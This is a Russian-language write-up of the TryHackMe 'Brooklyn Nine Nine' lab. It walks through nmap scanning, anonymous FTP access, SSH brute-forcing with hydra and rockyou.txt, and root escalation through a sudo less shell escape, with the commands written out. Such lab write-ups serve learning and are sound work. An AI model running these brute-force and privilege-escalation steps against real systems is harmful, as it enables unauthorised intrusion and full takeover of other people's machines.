# Brooklyn Nine Nine - TryHackMe

**Сложность:** Easy  
**Дата:** Октябрь 2026

---

## С чего начал

Запустил nmap чтобы посмотреть что вообще открыто на машине:

```bash
nmap -sV -sC -Pn 10.112.163.224
```

Нашёл три открытых порта - FTP, SSH и веб-сервер. Первое что бросилось 
в глаза - FTP разрешает анонимный вход и nmap сразу показал что там 
лежит файл note_to_jake.txt.

---

## FTP - первая зацепка

Зашёл на FTP анонимно и скачал файл:

```bash
ftp 10.112.163.224
# anonymous / (пустой пароль)
get note_to_jake.txt
```

Внутри оказалась записка от Amy к Jake с просьбой сменить пароль 
потому что он слишком слабый. Из записки стало понятно что на машине 
есть три пользователя - jake, amy и holt. И что у jake слабый пароль.

---

## Брутфорс SSH

Раз пароль слабый - попробовал подобрать его через hydra с rockyou.txt:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.112.163.224 ssh
```

Нашёл довольно быстро - пароль оказался 987654321. Зашёл по SSH:

```bash
ssh jake@10.112.163.224
```

---

## Внутри машины

В домашней папке jake ничего интересного не было. Проверил другие 
директории и нашёл user флаг у пользователя holt:

```bash
cat /home/holt/user.txt
```

Затем проверил что jake может делать через sudo:

```bash
sudo -l
```

Оказалось что jake может запускать /usr/bin/less от root без пароля. 
Это уже интересно.

---

## Получение root

Заглянул на GTFOBins и нашёл что через less можно получить shell. 
Запустил less от root:

```bash
sudo less /etc/profile
```

Внутри less ввёл:!/bin/sh


Less выполнил команду от имени root и я получил root shell. 
Забрал финальный флаг:

```bash
cat /root/root.txt
```

---

## Что узнал из этой машины

Анонимный FTP это первое что нужно проверять - там часто лежит 
что-то полезное. Слабые пароли ломаются за минуты через rockyou.txt. 
sudo -l всегда нужно проверять после получения доступа - даже 
безобидная программа типа less может дать полный контроль над системой 
если её можно запустить через sudo.
